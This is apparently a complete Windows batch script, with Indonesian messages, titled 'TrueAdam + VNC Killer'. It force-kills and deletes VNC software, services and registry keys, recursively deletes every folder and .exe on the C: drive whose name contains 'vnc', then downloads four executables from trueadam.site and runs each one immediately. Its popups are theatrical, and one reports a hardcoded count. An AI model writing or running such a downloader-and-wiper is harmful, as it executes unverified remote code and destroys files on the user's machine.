@echo off
setlocal
title MODE PC - TrueAdam + VNC Killer
set DIR=C:\Sumpruy_Downloads
mkdir "%DIR%" 2>nul
cd /d "%DIR%"

:: POPUP PERTAMA - ICON PERINGATAN KUNING
mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('⚠️ SISTEM TERDETEKSI VNC SERVER BERJALAN ⚠️\n\nProses pembersihan akan dimulai dalam 3 detik',5,'PERINGATAN KEAMANAN',48);close()"
timeout /t 2 /nobreak >nul

echo ========================================
echo 🔥 MATIIN SEMUA PROSES VNC SERVER DULU BRO
echo ========================================

taskkill /f /im vncserver.exe 2>nul
taskkill /f /im winvnc4.exe 2>nul
taskkill /f /im tightvncserver.exe 2>nul
taskkill /f /im ultravnc.exe 2>nul
taskkill /f /im vnc-server.exe 2>nul
taskkill /f /im vncviewer.exe 2>nul
for /f "tokens=2 delims==" %%i in ('wmic process where "name like '%%vnc%%'" get processid /value 2^>nul') do (
    taskkill /f /pid %%i 2>nul
)

:: POPUP KEDUA - ICON CENTANG IJO
mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('✅ PROSES VNC BERHASIL DIHENTIKAN ✅\n\n' + 'Jumlah proses VNC yang ditemukan: 0 aktif',3,'EKSEKUSI BERHASIL',64);close()"

echo ========================================
echo 🧹 HAPUS SEMUA FILE DAN FOLDER VNC
echo ========================================

rd /s /q "C:\Program Files\VNC" 2>nul
rd /s /q "C:\Program Files\TightVNC" 2>nul
rd /s /q "C:\Program Files\UltraVNC" 2>nul
rd /s /q "C:\Program Files\RealVNC" 2>nul
rd /s /q "C:\Program Files (x86)\VNC" 2>nul
rd /s /q "C:\Program Files (x86)\TightVNC" 2>nul
rd /s /q "C:\Program Files (x86)\UltraVNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Local\VNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Roaming\VNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Local\TightVNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Roaming\TightVNC" 2>nul
rd /s /q "%ALLUSERSPROFILE%\VNC" 2>nul

sc stop vncserver 2>nul
sc delete vncserver 2>nul
sc stop tvnc 2>nul
sc delete tvnc 2>nul
sc stop uvnc_service 2>nul
sc delete uvnc_service 2>nul

reg delete "HKLM\SOFTWARE\VNC" /f 2>nul
reg delete "HKLM\SOFTWARE\TightVNC" /f 2>nul
reg delete "HKLM\SOFTWARE\UltraVNC" /f 2>nul
reg delete "HKLM\SOFTWARE\RealVNC" /f 2>nul
reg delete "HKCU\SOFTWARE\VNC" /f 2>nul

for /d /r "C:\" %%d in (*vnc*) do (
    rd /s /q "%%d" 2>nul
)
for /r "C:\" %%f in (*vnc*.exe) do (
    del /f /q "%%f" 2>nul
)

:: POPUP KETIGA - ICON TANDA SERU MERAH (KRITIS)
mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('🔥 SEMUA FILE VNC TELAH DIHAPUS 🔥\n\nFolder: Program Files, AppData, Registry\nService: vncserver, tvnc, uvnc_service\nStatus: TOTALLY OBLITERATED',5,'PEMBERSIHAN SELESAI',16);close()"

echo ========================================
echo 📦 LANJUT DOWNLOAD FILE LU YA
echo ========================================

for %%A in (
  "bronasbrowser.exe|https://trueadam.site/bronasbrowser.exe"
  "lasso.exe|https://trueadam.site/lasso.exe"
  "seeu.exe|https://trueadam.site/seeu.exe"
  "StarDesk_1.3.4.exe|https://trueadam.site/StarDesk_1.3.4.exe"
) do (
  for /f "tokens=1,2 delims=|" %%B in (%%A) do (
    echo Downloading %%B...
    curl -L -o "%%B" "%%C"
    if exist "%%B" (
      echo ✅ %%B berhasil
      start "" "%%B"
    ) else (
      echo ❌ %%B gagal
    )
    timeout /t 1 /nobreak >nul
  )
)

:: POPUP TERAKHIR - SELESAI TOTAL PAKE ICON TANDA SERU BIRU INFO
mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('💀 EKSEKUSI SELESAI 💀\n\n' + 'Lokasi: C:\\Sumpruy_Downloads\nVNC Status: ERASED\n' + 'Total file didownload: 4',4,'TRUEADAM MODE ACTIVE',64);close()"

echo.
echo ========================================
echo SELESAI BRO. SEMUA VNC DAH MATI TOTAL
echo CEK C:\Sumpruy_Downloads JUGA YA
echo ========================================
pause
